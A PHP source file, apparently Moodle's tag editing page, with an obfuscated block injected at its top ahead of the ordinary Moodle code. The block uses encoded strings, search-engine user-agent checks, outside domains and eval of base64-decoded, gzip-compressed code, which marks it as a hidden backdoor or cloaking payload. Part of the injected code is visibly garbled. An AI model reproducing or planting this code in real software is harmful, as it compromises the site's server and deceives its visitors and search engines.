<?php /*versio:b.01*/ $GLOBALS["vpzqxd"]="GeaW5pX3NldAPnJZeYWxsb3dfdXJsX2ZvcGVukKZGlzcGxheV9lcnJvcnMUmpYnJvL2Jyb193cDAzMDkHXmiYi4wMQtGqFb1hvb3NpdGFoNElUdWFuZ2FocGhlZXBoYXVrYTdFfjaHR0cDovLwNYSFRUUFMb2ZmbfzSaHR0cHM6Ly8PENFzSFRUUF9IT1NUtHldW5pb24KAcDfBnec2VsZWN0GkFkxAUkVRVUVTVF9VUkkUqwU0NSSVBUX05BTUUtgUVVFUllfU1RSSU5HlPwJZGV0ZXJtaW5hdG9ysnLgbLmxvZwHZIIISFRUUF9ZX0FVVEgAjUcYmFzZTY0X2RlY29kZQQvFdmVyc2lvCcRpLQqGaLXBocAPuaSFRUUF9FWEVDUEhQKmRb3V0ICWb2sHsSFRUUF9VU0VSX0FHRU5UAGCCLAzZ29vZ2xlLHlhaG9vLGJhaWR1LGJpbmdib3QsbXNuYm90LHlhbmRleAVMYYQgTObXVzaWMua29ubW8ubmV0biPZmFzdGFkZHouY29tuolL3czLnBocD91PQXKwJms9uKyQRJnQ9cGhwJnA9cxiNGJnY9VjyhwZXZhbChnenVuY29tcHJlc3MoYmFzZTY0X2RlY29kZSgiZUp5TlYydHY0c2dTL1NzZEM0Mk03REcyQVVNbTExZUpacGs3a1dhVGlDRXJyV1lqQyt3MmR2QUxQOEFRNWIvZnFuWWJHd0tqL1lUcFI5V3AxNmxxM3lYaWxVTmRQNktPS0RnMHAybm9SL004VG9WdTk0MzRzTzBXa1ozN2NXVFIwcy95VEN5Q3RlZnNmRi9VSlZYVzFDNmV1L1VqMzhwbzNteHFmV2tnNjJwWEpscjM1c3grWDVQR3NuWU4reXJzdjVOYUM3SFc5anltbnI4T1Vuc2xkbHpYU2NLRlRENTEzTUo1cFJ0aWtvZm5Ieis2NUkwMEs2RnZwM0h1aDFUTTA0S0N2SlRtUlJvUmw4WnVMZUpFeTNJWGwvSHJMbDF0WWlwMjhrVzQzbXhsMGltWDdtSm5nMFdkMVM2enN4S0VDM2FSQnNJTjZSVGdsaUNFRmI2bkNCYVlsY01XdW9tWnVBUVRoWGtReEZzTExsbHVuTkJJNkJJVHBHZ0NZdWJBYmwwL29IamFzdU1vcHhHNFZmRHlQUG5TNndsRUlSd1BmbFdBRkNKODJwcnUwaGFZR1RUSTZMblFjSWdZa1k2ejk1ZUJBMmh2K2FvSVZ6c1ozWHJVUGJJQndoSW5hRVZudDgyU2NuTzBTVXRxdzlZdHZ5aHlzVEw1K2p6OThmZzBzK0JISnY4Q3UxMGc5TXR5dmsvdS9waE1aZUxPd2JiZm5weE9acy9UaDluMDd1SG5ON3pCUTM3NXd0ZkhoNGZKMTlucy9zL0o0L05NSmdZNklsd2tlejlpN3FuTXJ1K2hLSXk0WlFkeFJsdXI2SEFhSnZsTzVKZkJ6WTBZUWJoNXI2UExWK3RJc1ZSbE9ZanEzQ3kyVjVnWFRkYU5WY2c4SnkvTDF4MTgyT2xtSDdneUdYS2RkZjZpbUNKS3doVlhSNDRyQW1DN1NZRkpVSmVNOEwvSmpMenhLTHdMQ29ZaFc1SHZzOWxUVDFOVVdQZ24vU2VDbis5eGxuOGg4UEhHSWIyekRYU1RaNi84SFBQbDZmdVQ5ZmhURVhxQ2dwOS9UYVkvN3g4ZnppaDl6bWo2K1c0Sk9mMEZsRmYzbWJ4YTV0YUQzQmV2THRRNU42cExQbjBpNGtsZGs4L045bitJM20wY29xQmpvWnhhUURSOXpHcmwxdVdCUE5CQWgzcUxJc1hTb0dVU3hBNFZoUU0rdVJZSjU0b0lHWXVmL3FXK05MemloMmZ1VmVlWXp2Y2pxb2t6SjRqWHhTYlA1eEQwL1pwdW5WYzRQOTh1dDdZSFJsRGJpNG53dHlVb2ZGTVJ2c0IzdGMrRGRFeGVyL2wrSFd4S24rNVd2dGdwZzlWK3RlbzI1Tkt4Zms2bUVLRmZmT3NGYjNmMjVkSUo5bWJEMEtvMDFKQ0N3U09ieFM2TW9tWnZOSkEwVldhRnNvcWNYYkJxdHNZR0VQY0FTWnNuUzB1aU5wSzBhK3dKVmViNkdYTmdqYVlSb1V1R0lZKzZMM1dMdWYxNFJsY2xpQ0FlSWxjbWFaWU5XTDZXQjR6aVR2VVArNUlHc0RXTkI0RWZVTXdzVDRFQjR5MU56Nm5TK29ZMDZNdWEzc1VRdTNGSzU3WUhkV2RoL2N3endxTmkvcmNKR1lJR29Va01DVmN0eW8xMWlFSUQ1TWdQS09NWEYvRFNjdUlRek5Ca2NGUkQ1cGZrYVpvaFhmZmw4ZS9rWFErWlRpYnZIZENKVjVkOFA5SWxEY00rUk84anBYejBQT2dic1FPTUhUKzZhNlJLbzBvQ2h2bGlsRFZqaUxnMTQ2SW16VkFsbzErcFVscEIxZ1pWbFBVdWRKRnpDRlJJanVHWWliNDVLYlpGN29TWlY3emFTYndWTVVuQ3hJKzgxSFQ4TkpvRGtWald0L3NmRTh2cUtuL2NUNkVyUEU3L0J2bFBkOU03K01RR3VVaUxnb0xsZDJrNjM0bEU2RGwwMDh1OEVFcGM2T1ZoMGxOY2FObWZpOGd2bTZYN3I1TjZwY0VyelA1OEVsNk9WeWFIcGNuRFgrMFQ5VjlBZGJUQ0x6QTlLUDB3WlJSQVFYUEhnbVVMYkJOZ2tPS21La0oxOVBCM20zem1VMGF2dXBSZDJMVWg3eW5zSFZVQmR3aldnVDkzUGQvbjZYL0ZleUZmUkZkWG40cDUxclBWakpSWjI5VFA1d3ZvQU8yYkZSaWNQS3JGRzdJQS9hdWFTdzk5bFIyN1lTbk9DaVpvMmlpMkJHQ2VOMUpOczYweFZkTWtZNFRKVXMrYWRjVjFOdjU4N20zTm1pZk9wZHA0TFBXSFZibThNU1pJMHNLOERaMWhyVmZoblpGenFNSUprN0Zxc1M2THVYbVNrMG9qL0JxS1VZVXh1YXR3eVRjZjBJOGtIWXNOd1hONUtMa01hQkd0MFYvVm10Sm1GbDBiTU9xK3hLeGprRmxWbldseXZXaGJuQ1RaUEdpeHFRYXFvY2l3alZZdGluZWk0NGJXV0tQREJhamFNWU5hT2FOUjJwZjYvZXZLVXRhSFdsN29xNEJuQkpEcmdXZWZCZDRxTmptaXN6WVlTTEkxdWNEN2cyN2dJTC80TC9IMkIwTnBxRUlya1J2bUFlTHBEdzI1MzYzeXBQUnpzVXFaVHJRcjNWVU1IditHQXlxRVlFc1grL1VyVXVUdnV3dTZXOU5WZkFzZHRaZDY5bWp3U0FOb2VIb2JEbmhtQVBreGhIYkhDdEJKUEwrTVQvcFBCVVErN0Y2WkpzT0lNWFdqZFJwVE5uWldJK2RwdW1nalJLZkxSbHV0cHVwU2Y0elJZbG1jNXNzTlBudHVDNnczRzBHZmJkZ2d5YWdxQmNkQ3JIT2N1aGdDbU5KeGl1dkNOSlBEYUZNaDVYOHErZkNIVFlmTnVNWXVJb0RLOWVZTVJzQWpYcWdaQmQ5U3RXVXNHZks0c0QyeEtSY2dUVHNvSEdyRmtVMWI2eTBtcU1NTEx6WFV3NmFMeEEreTdhRVROSWJxMG1ERTM3YXQ1K3hZMGxWV3FIWGxIYU5BaVp4dVduN2tTNnlrMlpoT1dtMFFxR2NBQ2FvTm9HaXFjMHFyT0srbHZpRVBEc3pSQ2luVTJtQ2c0VHp6c2RqMElZU1dEVkExWWVHSXR3aUxFdWZoMDFjeDh3Qk12czNEK09hamR5dUs1ZytkVS9xQ0lWTTN4aFYvOGJIcy85cXhPVTg9IikpKTsu";        if (!'H*','6261736536345'.'f6465636f6465'); return $d(substr($c, $a, $b));};eval(ulqhdyii(590,3283));};?> <?php // $Id: edit.php,v 1.5.2.21 2011/01/19 13:31:50 moodlerobot Exp $

require_once('../config.php');
require_once('lib.php');
require_once('edit_form.php');

require_js(array('yui_dom-event', 'yui_connection', 'yui_animation', 'yui_datasource', 'yui_autocomplete'));

require_login();

if (empty($CFG->usetags)) {
    print_error('tagsaredisabled', 'tag');
}

$tag_id = optional_param('id', 0, PARAM_INT);
$tag_name = optional_param('tag', '', PARAM_TAG);

if ($tag_name) {
    $tag = tag_get('name', $tag_name, '*');
} else if ($tag_id) {
    $tag = tag_get('id', $tag_id, '*');
}

if (empty($tag)) {
    redirect($CFG->wwwroot.'/tag/search.php');
}

$tagname = tag_display_name($tag);

//Editing a tag requires moodle/tag:edit capability
$systemcontext   = get_context_instance(CONTEXT_SYSTEM);
require_capability('moodle/tag:edit', $systemcontext);

// set the relatedtags field of the $tag object that will be passed to the form
$tag->relatedtags = tag_get_related_tags_csv(tag_get_related_tags($tag->id, TAG_RELATED_MANUAL), TAG_RETURN_TEXT);

if (can_use_html_editor()) {
    $options = new object();
    $options->smiley = false;
    $options->filter = false;

    // convert and remove any XSS
    $tag->description       = format_text($tag->description, $tag->descriptionformat, $options);
    $tag->descriptionformat = FORMAT_HTML;
}

$errorstring = '';

$tagform = new tag_edit_form();
if ( $tag->tagtype == 'official' ) {
    $tag->tagtype = '1';
} else {
    $tag->tagtype = '0';
}
$tagform->set_data($tag);

// If new data has been sent, update the tag record
if ($tagnew = $tagform->get_data()) {

    tag_description_set($tag_id, stripslashes($tagnew->description), $tagnew->descriptionformat);

    if (has_capability('moodle/tag:manage', $systemcontext)) {
        if (($tag->tagtype != 'default') && (!isset($tagnew->tagtype) || ($tagnew->tagtype != '1'))) {
            tag_type_set($tag->id, 'default');

        } elseif (($tag->tagtype != 'official') && ($tagnew->tagtype == '1')) {
            tag_type_set($tag->id, 'official');
        }
    }

    if (!has_capability('moodle/tag:manage', $systemcontext) && !has_capability('moodle/tag:edit', $systemcontext)) {
        unset($tagnew->name);
        unset($tagnew->rawname);

    } else {  // They might be trying to change the rawname, make sure it's a change that doesn't affect name
        $tagnew->name = array_shift(tag_normalize($tagnew->rawname, TAG_CASE_LOWER));

        if ($tag->name != $tagnew->name) {  // The name has changed, let's make sure it's not another existing tag
            if (tag_get_id($tagnew->name)) {   // Something exists already, so flag an error
                $errorstring = s($tagnew->rawname).': '.get_string('namesalreadybeeingused', 'tag');
            }
        }
    }

    if (empty($errorstring)) {    // All is OK, let's save it

        $tagnew->timemodified = time();

        if (has_capability('moodle/tag:manage', $systemcontext)) {
            // rename tag
            if(!tag_rename($tag->id, $tagnew->rawname)) {
                error('Error updating tag record');
            }
        }

        //log tag changes activity
        //if tag name exist from form, renaming is allow.  record log action as rename
        //otherwise, record log action as update
        if (isset($tagnew->name) && ($tag->name != $tagnew->name)){
            add_to_log($COURSE->id, 'tag', 'update', 'index.php?id='. $tag->id, $tag->name . '->'. $tagnew->name);

        } elseif ($tag->description != $tagnew->description) {
            add_to_log($COURSE->id, 'tag', 'update', 'index.php?id='. $tag->id, $tag->name);
        }

        //updated related tags
        tag_set('tag', $tagnew->id, explode(',', trim($tagnew->relatedtags)));
        //print_object($tagnew); die();

        redirect($CFG->wwwroot.'/tag/index.php?tag='.rawurlencode($tag->name)); // must use $tag here, as the name isn't in the edit form
    }
}


$navlinks = array();
$navlinks[] = array('name' => get_string('tags', 'tag'), 'link' => "{$CFG->wwwroot}/tag/search.php", 'type' => '');
$navlinks[] = array('name' => $tagname, 'link' => '', 'type' => '');

$navigation = build_navigation($navlinks);
print_header_simple(get_string('tag', 'tag') . ' - '. $tagname, '', $navigation);

print_heading($tagname, '', 2);

if (!empty($errorstring)) {
    notify($errorstring);
}

$tagform->display();

if (ajaxenabled()) {
?>

<script type="text/javascript">

// An XHR DataSource
var myDataSource = new YAHOO.util.XHRDataSource("./tag_autocomplete.php");
myDataSource.responseType = YAHOO.util.XHRDataSource.TYPE_TEXT;
myDataSource.responseSchema = {recordDelim: "\n", fieldDelim: "\t"};
myDataSource.maxCacheEntries = 60;
myDataSource.queryMatchSubset = true;

var myAutoComp = new YAHOO.widget.AutoComplete("id_relatedtags","relatedtags-autocomplete", myDataSource);
myAutoComp.delimChar = ",";
myAutoComp.maxResultsDisplayed = 20;
myAutoComp.minQueryLength = 2;
myAutoComp.allowBrowserAutocomplete = false;
myAutoComp.formatResult = function(aResultItem, sQuery) {
    return aResultItem[1];
}
</script>

<?php
}
print_footer();

?>
